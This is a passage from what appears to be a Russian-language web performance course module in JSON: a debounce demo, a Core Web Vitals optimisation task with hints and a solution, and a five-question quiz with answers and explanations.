      "initialHtml": "<div id=\"perf-app\">\n  <h3>Симулятор оптимизации ввода (Debounce)</h3>\n  <input id=\"search-input\" placeholder=\"Начните быстро печатать текст...\" style=\"width:100%; padding:8px; background:#03060a; color:#2dff8a; border:1px solid #30363d; font-family:monospace;\" />\n  <div style=\"display:flex; gap:16px; margin-top:12px;\">\n    <div style=\"flex:1; padding:10px; background:#161b22; border:1px solid #f85149; border-radius:6px;\">\n      <strong style=\"color:#f85149;\">Без Debounce (вызовы API):</strong>\n      <div id=\"raw-count\" style=\"font-size:24px; font-weight:bold;\">0</div>\n    </div>\n    <div style=\"flex:1; padding:10px; background:#161b22; border:1px solid #2dff8a; border-radius:6px;\">\n      <strong style=\"color:#2dff8a;\">С Debounce 300ms:</strong>\n      <div id=\"debounced-count\" style=\"font-size:24px; font-weight:bold;\">0</div>\n    </div>\n  </div>\n</div>",
      "initialCss": "#perf-app {\n  font-family: monospace;\n  color: #e6edf3;\n  padding: 16px;\n  background: #0d1117;\n  border-radius: 8px;\n}",
      "initialJs": "const input = document.getElementById('search-input');\nconst rawEl = document.getElementById('raw-count');\nconst debEl = document.getElementById('debounced-count');\n\nlet rawCount = 0;\nlet debCount = 0;\n\nfunction debounce(fn, delay) {\n  let timer;\n  return (...args) => {\n    clearTimeout(timer);\n    timer = setTimeout(() => fn(...args), delay);\n  };\n}\n\nconst handleDebounced = debounce(() => {\n  debCount++;\n  debEl.textContent = debCount;\n}, 300);\n\ninput.addEventListener('input', () => {\n  rawCount++;\n  rawEl.textContent = rawCount;\n  handleDebounced();\n});",
      "instructions": "Практика Web Performance:\n1. Быстро напечатайте слово в инпуте и сравните счетчики\n2. Обратите внимание, как debounce сокращает число тяжелых вызовов в 5-10 раз, разгружая Main Thread\n3. Попробуйте изменить задержку debounce с 300ms на 500ms"
    },
    "task": {
      "title": "Аудит и комплексная оптимизация страницы каталога по Core Web Vitals",
      "scenario": "Страница каталога интернет-магазина провалила аудит Lighthouse (Score: 38/100): LCP равен 4.8s из-за неоптимизированного баннера, CLS составляет 0.45 из-за отсутствия размеров у карточек товаров, а поисковая строка замораживает интерфейс (INP > 600ms). Вам нужно реализовать модуль оптимизации.",
      "criteria": [
        "Реализовать HOF-утилиту debounce(fn, delayMs) для оптимизации инпута поиска",
        "Сформировать правильную HTML-разметку LCP-баннера с форматом picture (AVIF, WebP), fetchpriority='high' и явными width/height",
        "Задать CSS-правило aspect-ratio для карточек каталога для устранения CLS",
        "Написать асинхронную функцию chunkedProcessing(items, processFn, chunkSize)",
        "Соблюдать стандарты Core Web Vitals (LCP <= 2.5s, INP <= 200ms, CLS <= 0.1)"
      ],
      "starterCode": {
        "js": "// Реализуйте утилиты оптимизации производительности\nfunction debounce(fn, delayMs) {\n  // Ваш код\n}\n\nasync function chunkedProcessing(items, processFn, chunkSize = 50) {\n  // Разбивка длинной задачи\n}"
      },
      "hints": [
        "В debounce сохраняйте let timer и сбрасывайте через clearTimeout",
        "Для уступки потока используйте await new Promise(r => setTimeout(r, 0))",
        "В разметке баннера используйте <picture><source srcset='...avif' type='image/avif'><img fetchpriority='high' width='1200' height='600'>"
      ],
      "solution": {
        "js": "function debounce(fn, delayMs = 300) {\n  let timer = null;\n  return function (...args) {\n    clearTimeout(timer);\n    timer = setTimeout(() => fn.apply(this, args), delayMs);\n  };\n}\n\nasync function chunkedProcessing(items = [], processFn, chunkSize = 50) {\n  const results = [];\n  for (let i = 0; i < items.length; i += chunkSize) {\n    const chunk = items.slice(i, i + chunkSize);\n    for (const item of chunk) {\n      results.push(processFn(item));\n    }\n    // Уступка Main Thread браузеру для отрисовки кадров\n    await new Promise((resolve) => setTimeout(resolve, 0));\n  }\n  return results;\n}",
        "explanation": "debounce устраняет спам вызовов и разгружает Main Thread (улучшая INP). chunkedProcessing разбивает длинную задачу на микропакеты, предотвращая зависание интерфейса."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro5-q1",
          "question": "Какое пороговое значение метрики LCP (Largest Contentful Paint) считается отличным (Good) по стандарту Google Core Web Vitals?",
          "options": [
            "<= 100 миллисекунд",
            "<= 2.5 секунды",
            "<= 5.0 секунд",
            "<= 0.1"
          ],
          "correctIndex": 1,
          "explanation": "По стандарту Google Core Web Vitals значение LCP считается хорошим (Good / в зеленой зоне), если оно составляет 2.5 секунды или меньше."
        },
        {
          "id": "pro5-q2",
          "question": "Какую проблему решает метрика INP (Interaction to Next Paint), сменившая FID в Core Web Vitals?",
          "options": [
            "Измеряет размер JavaScript бандла",
            "Измеряет задержку между действием пользователя (клик, ввод) и отрисовкой следующего кадра с визуальным откликом интерфейса",
            "Проверяет правильность контрастности цветов",
            "Измеряет скорость интернет-соединения"
          ],
          "correctIndex": 1,
          "explanation": "Метрика INP (Interaction to Next Paint) оценивает общую отзывчивость страницы на протяжении всего времени сессии: за сколько миллисекунд браузер успевает обновить экран после клика или нажатия клавиши (норма <= 200 мс)."
        },
        {
          "id": "pro5-q3",
          "question": "Почему добавление атрибута loading='lazy' на главное LCP-изображение первого экрана является грубой ошибкой?",
          "options": [
            "loading='lazy' ломает JavaScript на странице",
            "Браузер откладывает загрузку такого изображения, ожидая завершения рендеринга страницы, что искусственно ухудшает LCP на 1-2 секунды",
            "Картинка вообще не загрузится",
            "loading='lazy' запрещен стандартом W3C"
          ],
          "correctIndex": 1,
          "explanation": "loading='lazy' предназначен только для изображений ниже первого экрана. На LCP-элементе он заставляет браузер отложить сетевой запрос, что приводит к критическому ухудшению показателя LCP."
        },
        {
          "id": "pro5-q4",
          "question": "Как эффективно защитить страницу от высокого показателя сдвига макета (CLS)?",
          "options": [
            "Отключить загрузку картинок",
            "Всегда указывать атрибуты width и height на тегах <img> или задавать свойство aspect-ratio в CSS, а также использовать скелетонные экраны",
            "Увеличить размер шрифта",
            "Использовать position: absolute для всех элементов"
          ],
          "correctIndex": 1,
          "explanation": "Указание width/height или aspect-ratio позволяет браузеру мгновенно зарезервировать прямоугольную область точного размера в макете до скачивания изображения, снижая CLS до 0."
        },
        {
          "id": "pro5-q5",
          "question": "Какое свойство CSS-шрифтов предотвращает эффект невидимого текста (FOIT) при загрузке кастомного веб-шрифта?",
          "options": [
            "font-style: italic;",
            "font-display: swap;",
            "font-weight: bold;",
            "font-rendering: fast;"
          ],
          "correctIndex": 1,
          "explanation": "Директива font-display: swap в @font-face указывает браузеру мгновенно отобразить текст системным резервным шрифтом и заменить его на кастомный сразу после скачивания файла шрифта."
        }
      ]
    }
  }
];
